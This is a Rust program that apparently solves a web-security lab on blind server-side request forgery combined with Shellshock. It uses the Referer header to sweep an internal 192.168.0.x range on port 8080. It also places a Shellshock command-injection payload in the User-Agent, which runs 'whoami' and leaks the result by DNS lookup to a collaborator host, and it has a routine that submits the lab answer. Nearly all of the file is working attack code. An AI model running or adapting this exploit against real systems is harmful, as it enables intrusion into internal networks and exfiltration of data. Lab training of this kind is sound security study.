use futures::TryStreamExt;
use futures::{stream, StreamExt};
use reqwest::header::{HeaderMap, HeaderValue};
use std::error::Error;
use std::io;

pub async fn lookup(url: &str, collaborator: &str, threads: usize) -> Result<(), Box<dyn Error>> {
    let client = reqwest::Client::new();

    let urls = (0..256)
        .map(|i| format!("http://192.168.0.{}:8080", i))
        .collect::<Vec<_>>();

    let bodies = stream::iter(urls)
        .map(|referer| {
            let client = &client;
            async move {
                let payload = " () { :; }; /usr/bin/nslookup $(whoami)".to_string();
                let res = client
                    .get(format!("{}/product?productId=1", url))
                    .header("User-Agent", format!("{}.{}", payload, collaborator))
                    .header("Referer", referer.clone())
                    .send()
                    .await?;

                // println!("{:?}", res);
                Ok::<_, Box<dyn Error>>(( referer, res.status().is_success()))
            }
        })
        .buffer_unordered(256);

    bodies.try_for_each_concurrent(threads, |b| async move {
            match b {
                (_payload, true) => {
                    // println!("HAPPY: {}", _payload);
                }
                (_payload, false) => {
                    // println!("SAD: {}", _payload);
                }
            }
            Ok(())
        })
        .await?;

    Ok(())
}

pub async fn submit_solution(url: &str) -> Result<(), Box<dyn std::error::Error>> {
    let client = reqwest::Client::new();

    let mut answer = String::new();
    println!("User: ");
    io::stdin().read_line(&mut answer)
        .expect("Failed to read line");
    let answer = answer.trim_end();

    let payload = format!("answer={}", answer);

    let mut headers = HeaderMap::new();
    headers.insert("Content-Type", HeaderValue::from_static("application/x-www-form-urlencoded"));
    let request = client .post(format!("{}/submitSolution",url))
        .headers(headers)
        .body(payload)
        .build()?;


    let _ = client.execute(request).await?;
    Ok(())
}

